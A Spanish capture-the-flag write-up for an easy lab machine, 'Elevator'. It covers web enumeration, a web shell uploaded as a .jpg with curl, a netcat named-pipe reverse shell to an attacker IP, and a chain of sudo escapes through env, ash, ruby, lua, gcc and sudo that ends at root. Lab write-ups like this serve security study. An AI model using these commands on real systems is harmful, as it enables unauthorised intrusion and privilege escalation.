# ELEVATOR  

> Dificultad: Fácil  									

____

#### FASE ENUMERACIÓN / RECOPILACIÓN:

Primero comenzamos con los escaneos de puertos, servicios y versiones. Utilicé la herramienta nmap. Resultó en:  

> 80/tcp open  http    Apache httpd 2.4.62 ((Debian))
	
Luego proseguimos con la enumeración web. Para esto utilicé la herramienta wfuzz. La misma arrojó 3 directorios interesantes:  

> /javascript		      301
> /themes		          301
> /server-status	    403
>  /themes/uploads/	  200 		

Prosiguiendo con wfuzz, me enfoqué en la bpusqueda de recursos (URI):  

`wfuzz -c --hc 404,403 --hw 0 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt"-u "http://172.18.0.2/themes/FUZZ.FUZ2Z"`  

> /index.html		          200  
> /themes/upload.php	    200  
> /themes/archivo.html    200  

____
		
FASE EXPLOTACIÓN:
-----------------

	- Subir WebShell:
		- Por navegador --> webshell-lista.php.jpg
		- Por CLI:
			- ( curl -F "file=@../web-shell.php.jpg" "http://172.18.0.2/themes/archivo.html" ) # no muestra la ruta
			
		- Acceder:
			- http://localhost:9090/themes/uploads/6912508f2631b.jpg # Pendiente Meterpreter
	

		- Meterpreter:
			- whoami = www-data
			- Mejorar TTY:
				- RevShell:
					- rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.3 6660 > /tmp/f
					- No tiene Python* --> no se puede crear una PTY
			

FASE POST-EXPLOTACIÓN:
----------------------
	- Persistencia
	- Escalar Privilegios
		- Enumerar usuarios:
			- daphne
			- vilma 
			- shaggy
			- fred  
			- scooby 

		- Buscar credenciales
			- diccionario
			- sistema
		
		- grep -RIiEn "daphne|vilma|shaggy|fred|scooby" / 2>/dev/null 
			- /etc/sudoers.dpkg-old:1:www-data ALL=(daphne) NOPASSWD: /usr/bin/env
		
		- whoami = www-data
		- sudo -l
			- ALL=(daphne) NOPASSWD: /usr/bin/env
		- sudo -u daphne env /bin/sh
			- whoami = daphne
			- sudo -l
				- (vilma) NOPASSWD: /usr/bin/ash
			- sudo -u vilma /usr/bin/ash
				- whoami = vilma
				- sudo -l
					- (shaggy) NOPASSWD: /usr/bin/ruby
				- sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
					- whoami = shaggy
					- sudo -l
						- (fred) NOPASSWD: /usr/bin/lua
					- sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
						- whoami = fred
							- sudo -l
								- (scooby) NOPASSWD: /usr/bin/gcc
							- sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
								- whoami = scooby
								- sudo -l
									- (root) NOPASSWD: /usr/bin/sudo
								- sudo /usr/bin/sudo /bin/sh
									- whoami = root
